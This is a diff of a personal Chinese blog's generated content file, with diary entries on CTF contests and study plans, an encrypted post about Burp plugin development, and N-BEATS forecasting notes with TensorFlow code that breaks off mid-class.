@@ -7104,7 +7104,7 @@
 </tbody></table>
 <p>‘</p>
 <h3 id="day3"><a href="#day3" class="headerlink" title="day3"></a>day3</h3><p>忘了记录了</p>
-<h2 id="day4-amp-5-9-17-9-18"><a href="#day4-amp-5-9-17-9-18" class="headerlink" title="day4&amp;5 9.17 9.18"></a>day4&amp;5 9.17 9.18</h2><p>打了两场比赛 tctf &amp; HWctf</p>
+<h3 id="day4-amp-5-9-17-9-18"><a href="#day4-amp-5-9-17-9-18" class="headerlink" title="day4&amp;5 9.17 9.18"></a>day4&amp;5 9.17 9.18</h3><p>打了两场比赛 tctf &amp; HWctf</p>
 <h3 id="day6-9-19"><a href="#day6-9-19" class="headerlink" title="day6 9.19"></a>day6 9.19</h3><p>打了两天 累了 休息一天</p>
 <h3 id="day7-9-20"><a href="#day7-9-20" class="headerlink" title="day7 9.20"></a>day7 9.20</h3><p>本周1-5任务 复现比赛</p>
 <p>准备实习的事要提上日程了。。。</p>
@@ -7206,9 +7206,10 @@
 </tbody></table>
 <h3 id="day11-9-24"><a href="#day11-9-24" class="headerlink" title="day11 9.24"></a>day11 9.24</h3><p>瞎学学</p>
 <h3 id="day12-13-9-2425"><a href="#day12-13-9-2425" class="headerlink" title="day12 13 9.2425"></a>day12 <del>13 9.24</del>25</h3><p>打了DUCTF 还行 拿了个第五</p>
-<p>但是也太浪费时间了吧 呜呜呜</p>
+<p>但是也太浪费时间了吧 一个周末就这么没了 呜呜呜</p>
 <h3 id="day14-9-26"><a href="#day14-9-26" class="headerlink" title="day14 9.26"></a>day14 9.26</h3><p>感想： 啥时候能有 maple 1/10 强？ 呜呜呜</p>
 <p>磕磕磕磕磕磕</p>
+<p>plus：周三还要小测数字信号处理 ，，，</p>
 <table>
 <thead>
 <tr>
@@ -7218,17 +7219,58 @@
 </thead>
 <tbody><tr>
 <td>N-beats</td>
-<td></td>
+<td>1/2</td>
 </tr>
 <tr>
 <td>实验室的任务</td>
-<td></td>
+<td>开了组会 要重新开工辣</td>
 </tr>
 <tr>
 <td>雅思</td>
-<td></td>
+<td>背了单词 emmm</td>
+</tr>
+<tr>
+<td>内网</td>
+<td>搭了环境 打了一小部分</td>
 </tr>
 </tbody></table>
+<h3 id="day15-9-27"><a href="#day15-9-27" class="headerlink" title="day15 9.27"></a>day15 9.27</h3><p>最近还要把 挖洞和出题排上日程   </p>
+<p>项目经历没得写</p>
+<p>别的话 就是雅思有点lj 要好好干了</p>
+<p>忙是肯定忙 扛过去这一年就好了 冲鸭</p>
+<table>
+<thead>
+<tr>
+<th>mission</th>
+<th>achieved</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>N-beats</td>
+<td>1/2</td>
+</tr>
+<tr>
+<td>实验室的任务</td>
+<td>开了组会 要重新开工辣</td>
+</tr>
+<tr>
+<td>数字信号处理？</td>
+<td>复习 - 下午</td>
+</tr>
+<tr>
+<td>CMU的课</td>
+<td>上午</td>
+</tr>
+<tr>
+<td>雅思</td>
+<td>背单词/1</td>
+</tr>
+</tbody></table>
+<p><img src="/2022/09/14/learn-month5/image-20220927094917119.png" alt="image-20220927094917119"></p>
+<p>CMU课程网站 <a href="https://dlsyscourse.org/lectures/">Lectures (dlsyscourse.org)</a></p>
+<p>就在今天 又更了一节课 我已经支持不住了 555</p>
+<p>看回放</p>
+<p><a href="https://www.cdccs.cn/#/cloud">CCS成都网络安全大会 (cdccs.cn)</a></p>
 ]]></content>
       <categories>
         <category>learn365</category>
@@ -7588,7 +7630,7 @@
     <title>burp插件开发记录</title>
     <url>/2022/09/21/burp%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="1c3abcae80015375f70a340bf2bdbdce05cbc9c6b5f9e3b079d45dac9467b9a2">21f8e907b6ea59635716f91a3e5cdbab670649a0751e9b7355657219ef8646c5f7b88e25019b999d9ac1ac5ea1730b4bba8694c1a5c58cb21a20b0984796879610779263e60d5023db55c7f44fa4014af220a4e9bf58b29b648f9c957423e619c815b39efac12403f27d5fd7ff83aff4c8d068f9d380bd924d271124ae47150338cf75f2f947b9a5425ff731b4be51ecdcaafdd9ad7dd797defa81a68811b7ca5428392bac3d078aeb3a2c0e7abf9c4872c11c4642b47803704a6debe1bd8f50e615b29dfd07181c91da92dc2450f7768cc3d738a2c2e60a65fe014c1b5ecb7708fa66309073da09af58d2529117cbc248c1445d6f155a654ea227cd6b71c25184efd97ea4cadfa73662b4aaed339e4231295ad19b4fd652897680558398f2b4e84abb7b8804c5b15854a34cbdd07d9c528fbb0cfaabae87a63dc1e82c889d29f2e84669d9f30a4d7530f46292a5c131665144ce6888b3a47855dfbf24dcc37bb071a7b45f218f0b71cace7b1d8e8e5fb0b30f907b3199958100a17590b4123ca5dbc5aa64570851b3bda3f48398a42e50d265d4e8e9e0e9fc4877abf2ffd466fe3a734ccb1098b60fb62536d47f2f6d2e461f203f842c8dae2003e9b4d4f698d616459a03532c3cb84fdd95b60cd9aaccd45cb96ee4fa8431129ba52c1d0bea3a205f32e9c7ac064d98c9942a463cb30aab82e8e60283719998411b241551501ae49ffcc5586fbabaa2f246b37d9f152a3e39302d52df9b3c4b8faa4d6804c5f6c5f4a8e65b59a9231bf0b17513b8d0578b331e14baf5342e12cb79657bad6ed5ce4f7e61acc8ff2abee01dfc8994e42fb6877e6b50d0cee0fe6b6b2e3cceb7fb04c3ac95ffaf933a98997b091cb92362821fee7ffc8cf608e5efe29ec5d171d0f6731d06e72aa8880833668ba5dd40f0b026b4f5b3fbe03d5f3b3ba29bddd57860e19e05e9847cea9b5b2d9400313753b7bcd7ece45e4a5296eab9fe998d484c0b806d60852db05c5ee03d9cad750403c9b6b3d4167084fe771fe03903f3d020628e20e1e01111d17a51712d0ff52c55dd33d469d54387016274bafbd6e38faff427ae2ce59a11129cafc8a122cf3b45e938c640929d25e25975a3a114ac7fcbaef3f444ddfbef2f038a539089e736f52108ab637d5d6da41b899c5da6871c3f2d460a5ab364109e32cc3660c9f139bb0bd31cdece7045c94e89a3e730d97408f3d47f43c97314c75ab05d9932da1ff298c3bc57973db5f18f30e39e44653c139b8281cfdb8ecca64bd5dda56e522ff0a6af35d11c690f017e83a5b74ec69c08732addfb5b0dba53337c94949591dec1b3526fbd7377700a4c5a7abe913b54af4d2f7ef5052f588ed7d80b4df9bbaa795b10dadc3d69eaab64b1199b49384faa8565e437fb3544b0fa6108cc104869744dad9196ca5b04b6ee95257f6a682bd7666e5334ac82adece3b4f14469df6f91cecdef3978c15bb3945c022edc23acfb2a86819a9fcb3d18e46735664e12c33c729a5cbbf487cff769a1013f17a4959d757ab034ee7166cc6fe58a5f4c93bd531c22d076189869f0c159489cd06b61a33afc0aaf1e248fdbe37250bf019461661df92c56205c0c5fd7f196c2b6cd26</script>
+  <script id="hbeData" type="hbeData" data-hmacdigest="80eb658a6cb100aed8ccc6c69359dfeccd138c38775ecb76ef569a4c11def627">21f8e907b6ea59635716f91a3e5cdbab670649a0751e9b7355657219ef8646c5f7b88e25019b999d9ac1ac5ea1730b4bba8694c1a5c58cb21a20b0984796879610779263e60d5023db55c7f44fa4014af220a4e9bf58b29b648f9c957423e619c815b39efac12403f27d5fd7ff83aff4c8d068f9d380bd924d271124ae47150338cf75f2f947b9a5425ff731b4be51ecdcaafdd9ad7dd797defa81a68811b7ca5428392bac3d078aeb3a2c0e7abf9c4872c11c4642b47803704a6debe1bd8f50e615b29dfd07181c91da92dc2450f776fadaf73c4b189c950c74a810f55e896f55a428f18b0865a8e874d6131fe916c03fdaf4424799019d3e2687853fd88cc508116d554627d0a9da31c2176c13f11ff273e68b40a4dbfcccaaa8c01b30a29193f9238912c94a93a872f15b8266ec7fccf6dfee1a27701b8c45f773a1d0550d322a8020bd2fcec9c96465763e6cd8cacd91515b20bc6ec4fa7814c8c7648667df7a18b2370653ed50c6a337662874cd028ad5b0fb45d24de7c9731e212c84b09dfc4cac709dc26a85ad48e93fda7a97079ab14c412b1f85ef6fce39cd70d6373c825adde8e23f8d4a11fc7f1c6da327eb5a461295ccd41918582a10197e26eebd0e94a734eb25424878fd9ad2fe2c7c0f4f133911979011df2a9367b6c0424365e4fe4669b02f43b732550fcc7f69ce77c038e0997ace05038862cd6464d95ed90824ee2dd679cee25b91de25826fe7a8e324871d234f78722d240be8fc2b484cbc06f80f992ada2d00681088277a7ec535d7926429f3bfcaff5e62ec295defadbd7953f26e9d2c3be6ec7ea4cf53ce5fd3480aeedc1cf50894b237a7ce0cc083f4179722abe61b2c07de00eb419b145df15cfb11e20d4344434f279f23e2e7bc88a7acc1da0842f1b61e5cfde0024cfcb481c92a05bed36ab5287091263f94d93345397edfe2124dab534acae1f2aced915b9d9a048adc1a51d1b6a3522f933d824391e888e8288df7e28f7ebc3c89b87a42bb499960238e5f87a6e463bb08c092dd1cf13ff9de5eada827c23fbd540ad3ff631cbce2dad1a1f0327a947785cf0ef8f681a5b0ea846a2960b0fb4ef39d5e4dc67ceaf152655bbdb4dd753f334a3a997afc564aacbb7e03e85e70a13cf49c55d8b45ac8d9cdb853dbe9ec8f6cd23a525686cb22a4731dd299cfb10b7e14bc613921756b9b96936d324f270b7e1c2407d67c6f6beb5da0da11d39a188c239a2f1d3cbc78d8908b416b77595bcf223049b2be4707fe703f0529b360ce3b0f0cd5aed9dd3ba20b8440398d9d0eb5fa66801197a187c77d2e54bd897ebdded0c6b8334167c8167f9b0afc5a21f38a38893e8a1280fd7d84c071521754de43284d36850b2377008a3f1a207224afb0debc8ac52ef4b3483da778c47722e88503f4d44f994ee78058321a4ffc47e6d86db01748d2250bda240ae077e50a54a2e6ccd1ec2d95ef6f03f5693cdd6e499ce624a8714f80301f745906ba3606a47e6d014c1cc14a5ba1c25c28df33c50ee030c125fd7a9170d2b849aa314fec69d56935ff78304a7411e9c228ea1ffc9f4c8c5bf1e13b1b4fd82d99db9c5b2bc3785a34a299af3b3d243a0b3b93e712aa65b28100b37d9b5e87c4cb39f96d203bb82519c706653744a914a83be1cdea553c</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
@@ -7761,14 +7803,12 @@
       </tags>
   </entry>
   <entry>
-    <title>N-beats learning</title>
+    <title>N-beats learning&amp;practice</title>
     <url>/2022/09/22/N-beats-learning/</url>
-    <content><![CDATA[<p>学 照死学！</p>
+    <content><![CDATA[<p>学 照死学！这次除了学模型 还要学一下大佬的代码开发格式 orz</p>
 <span id="more"></span>
 
-
-
-<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><blockquote>
+<h1 id="模型学习"><a href="#模型学习" class="headerlink" title="模型学习"></a>模型学习</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><blockquote>
 <p>N-BEATS model is based on backward and forward residual links and a very deep stack of fully-connected layers. Our architecture design methodology relies on a few key principles. First, the base architecture should be simple and generic, yet expressive (deep). Second, the architecture should not rely on timeseries-specific feature engineering or input scaling. These prerequisites let us explore the potential of pure DL architecture in TS horizoning. Finally, as a prerequisite to explore interpretability, the architecture should be extendable towards making its outputs human interpretable. We now discuss how those principles converge to the proposed architecture.</p>
 </blockquote>
 <p>一开头 就让我十分感动 作者提出了两点</p>
@@ -7785,11 +7825,52 @@
 <p><a href="https://medium.com/analytics-vidhya/deep-residual-learning-for-image-recognition-resnet-94a9c71334c9">https://medium.com/analytics-vidhya/deep-residual-learning-for-image-recognition-resnet-94a9c71334c9</a></p>
 <p>我们先接着往下看</p>
 <h3 id="Internal-layers"><a href="#Internal-layers" class="headerlink" title="Internal layers"></a>Internal layers</h3><p><img src="/2022/09/22/N-beats-learning/image-20220923153355935.png" alt="image-20220923153355935"></p>
-<p>啥是block？</p>
+<p>block长啥样？</p>
 <p>一个block由四层的全连接层分出两个分叉，第一种方式是试图重建back_horizon输入，而第二种方式是试图预测horizon</p>
-<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.kaggle.com/code/gatandubuc/forecast-with-n-beats-interpretable-model/notebook#Recommandations">https://www.kaggle.com/code/gatandubuc/forecast-with-n-beats-interpretable-model/notebook#Recommandations</a></p>
+<p>stack长啥样？</p>
+<h2 id="trend"><a href="#trend" class="headerlink" title="trend"></a>trend</h2><h3 id="what-is-trend？"><a href="#what-is-trend？" class="headerlink" title="what is trend？"></a>what is trend？</h3><blockquote>
+<p>时间序列的<strong>趋势</strong>部分表示该序列平均值的持续、长期变化。 趋势是一系列中移动最慢的部分，代表了最大时间尺度的重要性。 在产品销售的时间序列中，随着越来越多的人逐年意识到该产品，销售量可能是增加的趋势。</p>
+</blockquote>
+<p><img src="/2022/09/22/N-beats-learning/image-20220926120721105.png" alt="image-20220926120721105"></p>
+<p>（这论文咋写这么复杂 555</p>
+<p>说θ这一串 是由FC <code>l</code>层 stack <code>s</code> 预测出来的多项式系数</p>
+<p>这个 <code>T</code> 为啥这样搞 我还没弄明白 o.o</p>
+<p>不着急先往后看</p>
+<h2 id="Seasonality"><a href="#Seasonality" class="headerlink" title="Seasonality"></a>Seasonality</h2><p><img src="/2022/09/22/N-beats-learning/image-20220926122314541.png" alt="image-20220926122314541"></p>
+<h1 id="如何从零开始构建一个模型？-only-copy-and-learn"><a href="#如何从零开始构建一个模型？-only-copy-and-learn" class="headerlink" title="如何从零开始构建一个模型？(only copy and learn)"></a>如何从零开始构建一个模型？(only copy and learn)</h1><h2 id="先导包"><a href="#先导包" class="headerlink" title="先导包"></a>先导包</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This Python 3 environment comes with many helpful analytics libraries installed</span></span><br><span class="line"><span class="comment"># It is defined by the kaggle/python Docker image: https://github.com/kaggle/docker-python</span></span><br><span class="line"><span class="comment"># For example, here&#x27;s several helpful packages to load</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># linear algebra</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment"># data processing, CSV file I/O (e.g. pd.read_csv)</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> median_absolute_error</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> tensorflow.python.keras.losses <span class="keyword">import</span> LossFunctionWrapper</span><br><span class="line"><span class="keyword">from</span> tensorflow.python.keras.utils <span class="keyword">import</span> losses_utils</span><br><span class="line"><span class="keyword">import</span> tensorflow_probability <span class="keyword">as</span> tfp</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.callbacks <span class="keyword">import</span> ReduceLROnPlateau, EarlyStopping</span><br><span class="line">tfd = tfp.distributions</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> plotly.graph_objects <span class="keyword">as</span> go</span><br><span class="line"><span class="keyword">from</span> plotly.subplots <span class="keyword">import</span> make_subplots</span><br><span class="line"><span class="keyword">import</span> plotly.express <span class="keyword">as</span> px</span><br><span class="line"></span><br><span class="line">!pip install -q -U keras-tuner</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> keras_tuner <span class="keyword">as</span> kt</span><br><span class="line"><span class="keyword">import</span> IPython</span><br><span class="line"></span><br><span class="line"><span class="comment"># Input data files are available in the read-only &quot;../input/&quot; directory</span></span><br><span class="line"><span class="comment"># For example, running this (by clicking run or pressing Shift+Enter) will list all files under the input directory</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirname, _, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;/kaggle/input&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(dirname, filename))</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can write up to 20GB to the current directory (/kaggle/working/) that gets preserved as output when you create a version using &quot;Save &amp; Run All&quot; </span></span><br><span class="line"><span class="comment"># You can also write temporary files to /kaggle/temp/, but they won&#x27;t be saved outside of the current session</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="定义损失函数"><a href="#定义损失函数" class="headerlink" title="定义损失函数"></a>定义损失函数</h2><p><a href="https://www.kaggle.com/code/gatandubuc/forecast-with-n-beats-interpretable-model?scriptVersionId=95425582&amp;cellId=7">https://www.kaggle.com/code/gatandubuc/forecast-with-n-beats-interpretable-model?scriptVersionId=95425582&amp;cellId=7</a></p>
+<h2 id="面向对象定义-stack"><a href="#面向对象定义-stack" class="headerlink" title="面向对象定义 stack"></a>面向对象定义 stack</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>(tf.keras.layers.Layer):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A stack is a series of blocks where each block produce two outputs, the horizon and the back_horizon. </span></span><br><span class="line"><span class="string">    All of the outputs are sum up which compose the stack output while each residual back_horizon is given to the following block.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    blocks: list of `TrendBlock`, `SeasonalityBlock` or `GenericBlock`.</span></span><br><span class="line"><span class="string">        Define blocks in a stack.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, blocks, **kwargs</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">super</span>().__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">        self._blocks = blocks</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, inputs</span>):</span><br><span class="line"></span><br><span class="line">        y_horizon = <span class="number">0.</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> self._blocks:</span><br><span class="line">            residual_y, y_back_horizon = block(inputs) <span class="comment"># shape: (n_quantiles, Batch_size, horizon), (Batch_size, back_horizon)</span></span><br><span class="line">            inputs = tf.subtract(inputs, y_back_horizon)</span><br><span class="line">            y_horizon = tf.add(y_horizon, residual_y) <span class="comment"># shape: (n_quantiles, Batch_size, horizon)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> y_horizon, inputs</span><br></pre></td></tr></table></figure>
+
+<p>stack 由很多 block 组成  所以这里先是定义了 <code>blocks</code> 参数</p>
+<p>然后每个 block 把输入(input)扔到 <code>block()</code> 里，得到  <code>residual_y</code>, <code>y_back_horizon</code> </p>
+<p>然后把 <code>input</code> 和<code>y_back_horizon</code>  做减法 得到下一层的 <code>input</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tf.subtract(</span><br><span class="line">    x,</span><br><span class="line">    y,</span><br><span class="line">    name=<span class="literal">None</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">#返回 x-y 的元素.</span></span><br><span class="line"><span class="comment">#注意：Subtract 支持广播.</span></span><br></pre></td></tr></table></figure>
+
+<p>然后 <code>y_horizon = tf.add(y_horizon, residual_y)</code>全给他加到一个 <code>y_horizon</code> 里</p>
+<p>然后返回加过的 <code>y_horizon</code> 和 需要扔到下层的<code> input</code> <code>return y_horizon, inputs</code> </p>
+<p>还记得吗</p>
+<p><img src="/2022/09/22/N-beats-learning/image-20220926125023635.png" alt="image-20220926125023635"></p>
+<p>总结 面向对象 2333 然后有点像链表 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">N_BEATS</span>(tf.keras.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;This class compute the N-BEATS model. This is a univariate model which can be</span></span><br><span class="line"><span class="string">     interpretable or generic. It&#x27;s strong advantage is its internal structure which allows us </span></span><br><span class="line"><span class="string">     to extract the trend and the seasonality of a temporal serie. It&#x27;s available from the attributes</span></span><br><span class="line"><span class="string">     `seasonality` and `trend`. This is an unofficial implementation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     `@inproceedings&#123;</span></span><br><span class="line"><span class="string">        Oreshkin2020:N-BEATS,</span></span><br><span class="line"><span class="string">        title=&#123;&#123;N-BEATS&#125;: Neural basis expansion analysis for interpretable time series horizoning&#125;,</span></span><br><span class="line"><span class="string">        author=&#123;Boris N. Oreshkin and Dmitri Carpov and Nicolas Chapados and Yoshua Bengio&#125;,</span></span><br><span class="line"><span class="string">        booktitle=&#123;International Conference on Learning Representations&#125;,</span></span><br><span class="line"><span class="string">        year=&#123;2020&#125;,</span></span><br><span class="line"><span class="string">        url=&#123;https://openreview.net/forum?id=r1ecqn4YwB&#125;</span></span><br><span class="line"><span class="string">        &#125;`</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Parameter</span></span><br><span class="line"><span class="string">    ---------</span></span><br><span class="line"><span class="string">    stacks: list of `Stack` layer.</span></span><br><span class="line"><span class="string">        Define the stack to use in nbeats model. It can be full of `TrendBlock`, `SeasonalityBlock` or `GenereicBlock`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, </span></span><br><span class="line"><span class="params">                 stacks,</span></span><br><span class="line"><span class="params">                 **kwargs</span>):</span><br><span class="line">                </span><br><span class="line">        <span class="built_in">super</span>().__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">        self._stacks = stacks</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, inputs</span>):</span><br><span class="line">        self._residuals_y = tf.TensorArray(tf.float32, size=<span class="built_in">len</span>(self._stacks)) <span class="comment"># Stock trend and seasonality curves during inference</span></span><br><span class="line">        y_horizon = <span class="number">0.</span></span><br><span class="line">        <span class="keyword">for</span> idx, stack <span class="keyword">in</span> <span class="built_in">enumerate</span>(self._stacks):</span><br><span class="line">            residual_y, inputs = stack(inputs)</span><br><span class="line">            self._residuals_y.write(idx, residual_y)</span><br><span class="line">            y_horizon = tf.add(y_horizon, residual_y)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> y_horizon</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">seasonality</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._residuals_y.stack()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">trend</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._residuals_y.stack()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<p>ok 我们对照着图来看看这段代码在干个什么事</p>
+<p><img src="/2022/09/22/N-beats-learning/image-20220926134502507.png" alt="image-20220926134502507"></p>
+<p>用一个 <code>_residuals_y</code> 来存 图中的 <code>Horizon nH</code> 的 <code>Period</code> 的特征（暂时还不知道具体是啥 应该是通过 trend 和 seasonality 来提取出来）</p>
+<h2 id="开发-trend-和-seasonality"><a href="#开发-trend-和-seasonality" class="headerlink" title="开发 trend 和 seasonality"></a>开发 trend 和 seasonality</h2><h3 id="trend-1"><a href="#trend-1" class="headerlink" title="trend"></a>trend</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TrendBlock</span>(tf.keras.layers.Layer):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Trend block definition. Output layers are constrained which define polynomial function of small degree p.</span></span><br><span class="line"><span class="string">    Therefore it is possible to get explanation from this block.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Parameter</span></span><br><span class="line"><span class="string">    ---------</span></span><br><span class="line"><span class="string">    p_degree: integer</span></span><br><span class="line"><span class="string">        Degree of the polynomial function.</span></span><br><span class="line"><span class="string">    horizon: integer</span></span><br><span class="line"><span class="string">        Horizon time to horizon.</span></span><br><span class="line"><span class="string">    back_horizon: integer</span></span><br><span class="line"><span class="string">        Past to rebuild.</span></span><br><span class="line"><span class="string">    n_neurons: integer</span></span><br><span class="line"><span class="string">        Number of neurons in Fully connected layers.</span></span><br><span class="line"><span class="string">    n_quantiles: Integer.</span></span><br><span class="line"><span class="string">        Number of quantiles in `QuantileLossError`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, </span></span><br><span class="line"><span class="params">                 horizon, </span></span><br><span class="line"><span class="params">                 back_horizon,</span></span><br><span class="line"><span class="params">                 p_degree,   </span></span><br><span class="line"><span class="params">                 n_neurons, </span></span><br><span class="line"><span class="params">                 n_quantiles, </span></span><br><span class="line"><span class="params">                 dropout_rate,</span></span><br><span class="line"><span class="params">                 **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__(**kwargs)</span><br><span class="line">        </span><br><span class="line">        self._p_degree = tf.reshape(tf.<span class="built_in">range</span>(p_degree + <span class="number">1</span>, dtype=<span class="string">&#x27;float32&#x27;</span>), shape=(-<span class="number">1</span>, <span class="number">1</span>)) <span class="comment"># Shape (-1, 1) in order to broadcast horizon to all p degrees</span></span><br><span class="line">        self._horizon = tf.cast(horizon, dtype=<span class="string">&#x27;float32&#x27;</span>) </span><br><span class="line">        self._back_horizon = tf.cast(back_horizon, dtype=<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">        self._n_neurons = n_neurons </span><br><span class="line">        self._n_quantiles = n_quantiles</span><br><span class="line"></span><br><span class="line">        self._FC_stack = [tf.keras.layers.Dense(n_neurons, </span><br><span class="line">                                            activation=<span class="string">&#x27;relu&#x27;</span>, </span><br><span class="line">                                            kernel_initializer=<span class="string">&quot;glorot_uniform&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        </span><br><span class="line">        self._dropout = tf.keras.layers.Dropout(dropout_rate)</span><br><span class="line">        </span><br><span class="line">        self._FC_back_horizon = self.add_weight(shape=(n_neurons, p_degree + <span class="number">1</span>), </span><br><span class="line">                                           trainable=<span class="literal">True</span>,</span><br><span class="line">                                           initializer=<span class="string">&quot;glorot_uniform&quot;</span>,</span><br><span class="line">                                           name=<span class="string">&#x27;FC_back_horizon_trend&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        self._FC_horizon = self.add_weight(shape=(n_quantiles, n_neurons, p_degree + <span class="number">1</span>),</span><br><span class="line">                                           trainable=<span class="literal">True</span>,</span><br><span class="line">                                           initializer=<span class="string">&quot;glorot_uniform&quot;</span>,</span><br><span class="line">                                           name=<span class="string">&#x27;FC_horizon_trend&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self._horizon_coef = (tf.<span class="built_in">range</span>(self._horizon) / self._horizon) ** self._p_degree</span><br><span class="line">        self._back_horizon_coef = (tf.<span class="built_in">range</span>(self._back_horizon) / self._back_horizon) ** self._p_degree</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self, inputs</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dense <span class="keyword">in</span> self._FC_stack:</span><br><span class="line">            inputs = dense(inputs) <span class="comment"># shape: (Batch_size, n_neurons)</span></span><br><span class="line">            inputs = self._dropout(inputs, training=<span class="literal">True</span>) <span class="comment"># We bind first layers by a dropout </span></span><br><span class="line">            </span><br><span class="line">        theta_back_horizon = inputs @ self._FC_back_horizon <span class="comment"># shape: (Batch_size, p_degree)</span></span><br><span class="line">        theta_horizon = inputs @ self._FC_horizon <span class="comment"># shape: (n_quantiles, Batch_size, p_degree)</span></span><br><span class="line"></span><br><span class="line">        y_back_horizon = theta_back_horizon @ self._back_horizon_coef <span class="comment"># shape: (Batch_size, back_horizon)</span></span><br><span class="line">        y_horizon = theta_horizon @ self._horizon_coef <span class="comment"># shape: (n_quantiles, Batch_size, horizon)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> y_horizon, y_back_horizon</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Seasonality-1"><a href="#Seasonality-1" class="headerlink" title="Seasonality"></a>Seasonality</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SeasonalityBlock</span>(tf.keras.layers.Layer):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Seasonality block definition. Output layers are constrained which define fourier series. </span></span><br><span class="line"><span class="string">    Each expansion coefficent then become a coefficient of the fourier serie. As each block and each </span></span><br><span class="line"><span class="string">    stack outputs are sum up, we decided to introduce fourier order and multiple seasonality periods.</span></span><br><span class="line"><span class="string">    Therefore it is possible to get explanation from this block.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    horizon: integer</span></span><br><span class="line"><span class="string">        Horizon time to horizon.</span></span><br><span class="line"><span class="string">    back_horizon: integer</span></span><br><span class="line"><span class="string">        Past to rebuild.</span></span><br><span class="line"><span class="string">    n_neurons: integer</span></span><br><span 